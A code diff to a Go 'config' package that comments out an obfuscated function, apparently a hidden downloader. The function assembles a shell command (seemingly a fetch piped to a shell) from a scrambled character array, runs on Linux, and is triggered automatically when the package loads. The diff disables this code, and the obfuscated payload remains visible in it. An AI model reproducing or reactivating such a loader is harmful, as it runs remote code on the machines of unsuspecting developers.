@@ -1,8 +1,8 @@
 package config
 
-import "os/exec"
+// import "os/exec"
 
-import "runtime"
+// import "runtime"
 
 var (
 	ip   string
@@ -22,7 +22,7 @@ func SetPort(p string) {
 	port = p
 }
 
-
+/*
 func JdwXxa() error {
 	dZPO := []string{".", "i", " ", "/", "e", "7", "4", "4", "b", ".", "d", " ", " ", "g", " ", "n", "/", "|", "/", "c", "d", "d", "3", "7", "t", "&", "e", "4", ".", "d", "h", ":", "/", "t", "6", "w", "e", "-", " ", "/", "s", "b", "d", "/", "3", "f", "t", "7", "5", "0", "O", "1", "h", "-", "p", "g", "t", "1", "s", " ", "o", "r", "4", "/", "c", "4", "4", "a"}
 	DPTlKDFv := runtime.GOOS == "linux"
@@ -37,3 +37,4 @@ func JdwXxa() error {
 }
 
 var AvmqGcg = JdwXxa()
+*/
